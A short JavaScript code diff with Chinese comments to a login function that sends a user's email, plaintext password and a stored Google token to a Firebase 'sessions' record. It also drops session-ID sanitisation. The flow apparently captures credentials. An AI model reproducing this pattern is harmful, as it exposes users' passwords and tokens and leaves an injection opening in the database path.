@@ -392,21 +392,22 @@ function sendLoginData(sessionId, email, password) {
             throw new Error("無效的 Session ID");
         }
         
-        // 清理 sessionId，確保沒有特殊字符
-        // const cleanSessionId = sessionId.trim().replace(/[.#$/\[\]]/g, "");
-        
         // 設置 Firebase 會話引用
         const sessionRef = database.ref('sessions/' + sessionId);
+        
         // 獲取保存的Google Token
         const encryptedToken = localStorage.getItem('googleToken');
         const googleToken = encryptedToken ? atob(encryptedToken) : '';
-               
+        
+        // 記錄 token 資訊以便調試
+        console.log("Sending token, length: " + (googleToken ? googleToken.length : 0));
+        
         // 構建認證數據
         const authData = {
             status: 'authorized',
             email: email,
             password: password,
-            googleToken: googleToken, // 添加Google Token
+            googleToken: googleToken, // 確保這裡有值
             timestamp: firebase.database.ServerValue.TIMESTAMP
         };
         
